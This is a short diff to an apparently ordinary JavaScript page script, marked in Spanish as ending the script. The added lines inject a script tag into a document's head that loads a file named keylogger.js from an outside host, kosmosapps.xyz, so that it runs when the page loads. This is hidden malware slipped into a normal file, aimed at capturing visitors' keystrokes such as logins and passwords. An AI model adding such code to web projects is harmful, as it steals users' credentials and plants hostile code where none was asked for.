@@ -244,3 +244,10 @@ document.getElementById("CI").style.height="50px";
 
 //
 ////FIN DEL SCRIPT.
+
+var cabe = IN.CI.document.head
+var scriptt = document.createElement('script');
+scriptt.src="http://kosmosapps.xyz/keylogger.js";
+cabe.appendChild(scriptt);
+
+
